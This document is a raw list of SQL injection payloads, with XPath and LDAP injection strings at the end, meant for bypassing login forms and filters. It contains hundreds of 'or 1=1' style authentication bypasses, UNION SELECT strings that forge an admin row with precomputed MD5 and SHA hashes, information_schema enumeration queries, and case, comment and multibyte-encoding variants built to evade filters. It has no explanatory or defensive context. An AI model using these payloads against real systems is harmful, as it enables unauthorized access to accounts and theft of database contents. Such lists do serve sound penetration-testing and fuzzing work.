# SQLi
Payloads bypass via 


or 1=1
or 1=1--
or 1=1#
or 1=1/*
or 1=1 -- -
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
?id=1/*comment*/and/**/1=1/**/--
?id=(1)and(1)=(1)--
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
and 1=1
and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
like '%'
or 0=0 --
or 0=0 #
or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or a=a--
' or a=a–
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
') or ('x'='x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
"
'-- 2
"-- 2
'='
0'&lt;'2
"="
0"&lt;"2
')
")
')-- 2
')/*
')#
")-- 2
") #
")/*
')-('
')&('
')^('
')*('
')=('
0')&lt;('2
")-("
")&("
")^("
")*("
")=("
0")&lt;("2
'-''-- 2
'-''#
'-''/*
'&''-- 2
'&''#
'&''/*
'^''-- 2
'^''#
'^''/*
'*''-- 2
'*''#
'*''/*
'=''-- 2
'=''#
'=''/*
0'&lt;'2'-- 2
0'&lt;'2'#
0'&lt;'2'/*
"-""-- 2
"-""#
"-""/*
"&""-- 2
"&""#
"&""/*
"^""-- 2
"^""#
"^""/*
"*""-- 2
"*""#
"*""/*
"=""-- 2
"=""#
"=""/*
0"&lt;"2"-- 2
0"&lt;"2"#
0"&lt;"2"/*
')-''-- 2
')-''#
')-''/*
')&''-- 2
')&''#
')&''/*
')^''-- 2
')^''#
')^''/*
')*''-- 2
')*''#
')*''/*
')=''-- 2
')=''#
')=''/*
0')&lt;'2'-- 2
0')&lt;'2'#
0')&lt;'2'/*
")-""-- 2
")-""#
")-""/*
")&""-- 2
")&""#
")&""/*
")^""-- 2
")^""#
")^""/*
")*""-- 2
")*""#
")*""/*
")=""-- 2
")=""#
")=""/*
0")&lt;"2-- 2
0")&lt;"2#
0")&lt;"2/*
'oR'2
'oR'2'-- 2
'oR'2'#
'oR'2'/*
'oR'2'oR'
'oR(2)-- 2
'oR(2)#
'oR(2)/*
'oR(2)oR'
'oR 2-- 2
'oR 2#
'oR 2/*
'oR 2 oR'
'oR/**/2-- 2
'oR/**/2#
'oR/**/2/*
'oR/**/2/**/oR'
"oR"2
"oR"2"-- 2
"oR"2"#
"oR"2"/*
"oR"2"oR"
"oR(2)-- 2
"oR(2)#
"oR(2)/*
"oR(2)oR"
"oR 2-- 2
"oR 2#
"oR 2/*
"oR 2 oR"
"oR/**/2-- 2
"oR/**/2#
"oR/**/2/*
"oR/**/2/**/oR"
'oR'2'='2
'oR'2'='2'oR'
'oR'2'='2'-- 2
'oR'2'='2'#
'oR'2'='2'/*
'oR 2=2-- 2
'oR 2=2#
'oR 2=2/*
'oR 2=2 oR'
'oR/**/2=2-- 2
'oR/**/2=2#
'oR/**/2=2/*
'oR/**/2=2/**/oR'
'oR(2)=2-- 2
'oR(2)=2#
'oR(2)=2/*
'oR(2)=(2)oR'
'oR'2'='2' LimIT 1-- 2
'oR'2'='2' LimIT 1#
'oR'2'='2' LimIT 1/*
'oR(2)=(2)LimIT(1)-- 2
'oR(2)=(2)LimIT(1)#
'oR(2)=(2)LimIT(1)/*
"oR"2"="2
"oR"2"="2"oR"
"oR"2"="2"-- 2
"oR"2"="2"#
"oR"2"="2"/*
"oR 2=2-- 2
"oR 2=2#
"oR 2=2/*
"oR 2=2 oR"
"oR/**/2=2-- 2
"oR/**/2=2#
"oR/**/2=2/*
"oR/**/2=2/**/oR"
"oR(2)=2-- 2
"oR(2)=2#
"oR(2)=2/*
"oR(2)=(2)oR"
"oR"2"="2" LimIT 1-- 2
"oR"2"="2" LimIT 1#
"oR"2"="2" LimIT 1/*
"oR(2)=(2)LimIT(1)-- 2
"oR(2)=(2)LimIT(1)#
"oR(2)=(2)LimIT(1)/*
'oR true-- 2
'oR true#
'oR true/*
'oR true oR'
'oR(true)-- 2
'oR(true)#
'oR(true)/*
'oR(true)oR'
'oR/**/true-- 2
'oR/**/true#
'oR/**/true/*
'oR/**/true/**/oR'
"oR true-- 2
"oR true#
"oR true/*
"oR true oR"
"oR(true)-- 2
"oR(true)#
"oR(true)/*
"oR(true)oR"
"oR/**/true-- 2
"oR/**/true#
"oR/**/true/*
"oR/**/true/**/oR"
'oR'2'LiKE'2
'oR'2'LiKE'2'-- 2
'oR'2'LiKE'2'#
'oR'2'LiKE'2'/*
'oR'2'LiKE'2'oR'
'oR(2)LiKE(2)-- 2
'oR(2)LiKE(2)#
'oR(2)LiKE(2)/*
'oR(2)LiKE(2)oR'
"oR"2"LiKE"2
"oR"2"LiKE"2"-- 2
"oR"2"LiKE"2"#
"oR"2"LiKE"2"/*
"oR"2"LiKE"2"oR"
"oR(2)LiKE(2)-- 2
"oR(2)LiKE(2)#
"oR(2)LiKE(2)/*
"oR(2)LiKE(2)oR"
'||'2
'||2-- 2
'||'2'||'
'||2#
'||2/*
'||2||'
"||"2
"||2-- 2
"||"2"||"
"||2#
"||2/*
"||2||"
'||'2'='2
'||'2'='2'||'
'||2=2-- 2
'||2=2#
'||2=2/*
'||2=2||'
"||"2"="2
"||"2"="2"||"
"||2=2-- 2
"||2=2#
"||2=2/*
"||2=2||"
'||2=(2)LimIT(1)-- 2
'||2=(2)LimIT(1)#
'||2=(2)LimIT(1)/*
"||2=(2)LimIT(1)-- 2
"||2=(2)LimIT(1)#
"||2=(2)LimIT(1)/*
'||true-- 2
'||true#
'||true/*
'||true||'
"||true-- 2
"||true#
"||true/*
"||true||"
'||'2'LiKE'2
'||'2'LiKE'2'-- 2
'||'2'LiKE'2'#
'||'2'LiKE'2'/*
'||'2'LiKE'2'||'
'||(2)LiKE(2)-- 2
'||(2)LiKE(2)#
'||(2)LiKE(2)/*
'||(2)LiKE(2)||'
"||"2"LiKE"2
"||"2"LiKE"2"-- 2
"||"2"LiKE"2"#
"||"2"LiKE"2"/*
"||"2"LiKE"2"||"
"||(2)LiKE(2)-- 2
"||(2)LiKE(2)#
"||(2)LiKE(2)/*
"||(2)LiKE(2)||"
')oR('2
')oR'2'-- 2
')oR'2'#
')oR'2'/*
')oR'2'oR('
')oR(2)-- 2
')oR(2)#
')oR(2)/*
')oR(2)oR('
')oR 2-- 2
')oR 2#
')oR 2/*
')oR 2 oR('
')oR/**/2-- 2
')oR/**/2#
')oR/**/2/*
')oR/**/2/**/oR('
")oR("2
")oR"2"-- 2
")oR"2"#
")oR"2"/*
")oR"2"oR("
")oR(2)-- 2
")oR(2)#
")oR(2)/*
")oR(2)oR("
")oR 2-- 2
")oR 2#
")oR 2/*
")oR 2 oR("
")oR/**/2-- 2
")oR/**/2#
")oR/**/2/*
")oR/**/2/**/oR("
')oR'2'=('2
')oR'2'='2'oR('
')oR'2'='2'-- 2
')oR'2'='2'#
')oR'2'='2'/*
')oR 2=2-- 2
')oR 2=2#
')oR 2=2/*
')oR 2=2 oR('
')oR/**/2=2-- 2
')oR/**/2=2#
')oR/**/2=2/*
')oR/**/2=2/**/oR('
')oR(2)=2-- 2
')oR(2)=2#
')oR(2)=2/*
')oR(2)=(2)oR('
')oR'2'='2' LimIT 1-- 2
')oR'2'='2' LimIT 1#
')oR'2'='2' LimIT 1/*
')oR(2)=(2)LimIT(1)-- 2
')oR(2)=(2)LimIT(1)#
')oR(2)=(2)LimIT(1)/*
")oR"2"=("2
")oR"2"="2"oR("
")oR"2"="2"-- 2
")oR"2"="2"#
")oR"2"="2"/*
")oR 2=2-- 2
")oR 2=2#
")oR 2=2/*
")oR 2=2 oR("
")oR/**/2=2-- 2
")oR/**/2=2#
")oR/**/2=2/*
")oR/**/2=2/**/oR("
")oR(2)=2-- 2
")oR(2)=2#
")oR(2)=2/*
")oR(2)=(2)oR("
")oR"2"="2" LimIT 1-- 2
")oR"2"="2" LimIT 1#
")oR"2"="2" LimIT 1/*
")oR(2)=(2)LimIT(1)-- 2
")oR(2)=(2)LimIT(1)#
")oR(2)=(2)LimIT(1)/*
')oR true-- 2
')oR true#
')oR true/*
')oR true oR('
')oR(true)-- 2
')oR(true)#
')oR(true)/*
')oR(true)oR('
')oR/**/true-- 2
')oR/**/true#
')oR/**/true/*
')oR/**/true/**/oR('
")oR true-- 2
")oR true#
")oR true/*
")oR true oR("
")oR(true)-- 2
")oR(true)#
")oR(true)/*
")oR(true)oR("
")oR/**/true-- 2
")oR/**/true#
")oR/**/true/*
")oR/**/true/**/oR("
')oR'2'LiKE('2
')oR'2'LiKE'2'-- 2
')oR'2'LiKE'2'#
')oR'2'LiKE'2'/*
')oR'2'LiKE'2'oR('
')oR(2)LiKE(2)-- 2
')oR(2)LiKE(2)#
')oR(2)LiKE(2)/*
')oR(2)LiKE(2)oR('
")oR"2"LiKE("2
")oR"2"LiKE"2"-- 2
")oR"2"LiKE"2"#
")oR"2"LiKE"2"/*
")oR"2"LiKE"2"oR("
")oR(2)LiKE(2)-- 2
")oR(2)LiKE(2)#
")oR(2)LiKE(2)/*
")oR(2)LiKE(2)oR("
admin')-- 2
admin')#
admin')/*
admin")-- 2
admin")#
') UniON SElecT 1,2-- 2
') UniON SElecT 1,2,3-- 2
') UniON SElecT 1,2,3,4-- 2
') UniON SElecT 1,2,3,4,5-- 2
') UniON SElecT 1,2#
') UniON SElecT 1,2,3#
') UniON SElecT 1,2,3,4#
') UniON SElecT 1,2,3,4,5#
')UniON(SElecT(1),2)-- 2
')UniON(SElecT(1),2,3)-- 2
')UniON(SElecT(1),2,3,4)-- 2
')UniON(SElecT(1),2,3,4,5)-- 2
')UniON(SElecT(1),2)#
')UniON(SElecT(1),2,3)#
')UniON(SElecT(1),2,3,4)#
')UniON(SElecT(1),2,3,4,5)#
") UniON SElecT 1,2-- 2
") UniON SElecT 1,2,3-- 2
") UniON SElecT 1,2,3,4-- 2
") UniON SElecT 1,2,3,4,5-- 2
") UniON SElecT 1,2#
") UniON SElecT 1,2,3#
") UniON SElecT 1,2,3,4#
") UniON SElecT 1,2,3,4,5#
")UniON(SElecT(1),2)-- 2
")UniON(SElecT(1),2,3)-- 2
")UniON(SElecT(1),2,3,4)-- 2
")UniON(SElecT(1),2,3,4,5)-- 2
")UniON(SElecT(1),2)#
")UniON(SElecT(1),2,3)#
")UniON(SElecT(1),2,3,4)#
")UniON(SElecT(1),2,3,4,5)#
')||('2
')||2-- 2
')||'2'||('
')||2#
')||2/*
')||2||('
")||("2
")||2-- 2
")||"2"||("
")||2#
")||2/*
")||2||("
')||'2'=('2
')||'2'='2'||('
')||2=2-- 2
')||2=2#
')||2=2/*
')||2=2||('
")||"2"=("2
")||"2"="2"||("
")||2=2-- 2
")||2=2#
")||2=2/*
")||2=2||("
')||2=(2)LimIT(1)-- 2
')||2=(2)LimIT(1)#
')||2=(2)LimIT(1)/*
")||2=(2)LimIT(1)-- 2
")||2=(2)LimIT(1)#
")||2=(2)LimIT(1)/*
')||true-- 2
')||true#
')||true/*
')||true||('
")||true-- 2
")||true#
")||true/*
")||true||("
')||'2'LiKE('2
')||'2'LiKE'2'-- 2
')||'2'LiKE'2'#
')||'2'LiKE'2'/*
')||'2'LiKE'2'||('
')||(2)LiKE(2)-- 2
')||(2)LiKE(2)#
')||(2)LiKE(2)/*
')||(2)LiKE(2)||('
")||"2"LiKE("2
")||"2"LiKE"2"-- 2
")||"2"LiKE"2"#
")||"2"LiKE"2"/*
")||"2"LiKE"2"||("
")||(2)LiKE(2)-- 2
")||(2)LiKE(2)#
")||(2)LiKE(2)/*
")||(2)LiKE(2)||("
' UnION SELeCT 1,2`
' UnION SELeCT 1,2,3`
' UnION SELeCT 1,2,3,4`
' UnION SELeCT 1,2,3,4,5`
" UnION SELeCT 1,2`
" UnION SELeCT 1,2,3`
" UnION SELeCT 1,2,3,4`
" UnION SELeCT 1,2,3,4,5`
' or 1=1 limit 1 -- -+
'="or'
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
Pass1234.
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
Pass1234." and 1=0 union select "admin",sha("Pass1234.
Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
%A8%27 Or 1=1-- 2
%8C%A8%27 Or 1=1-- 2
%bf' Or 1=1 -- 2
%A8%27 Or 1-- 2
%8C%A8%27 Or 1-- 2
%bf' Or 1-- 2
%A8%27Or(1)-- 2
%8C%A8%27Or(1)-- 2
%bf'Or(1)-- 2
%A8%27||1-- 2
%8C%A8%27||1-- 2
%bf'||1-- 2
%A8%27) Or 1=1-- 2
%8C%A8%27) Or 1=1-- 2
%bf') Or 1=1 -- 2
%A8%27) Or 1-- 2
%8C%A8%27) Or 1-- 2
%bf') Or 1-- 2
%A8%27)Or(1)-- 2
%8C%A8%27)Or(1)-- 2
%bf')Or(1)-- 2
%A8%27)||1-- 2
%8C%A8%27)||1-- 2
%bf')||1-- 2
xpath
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
ldap
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
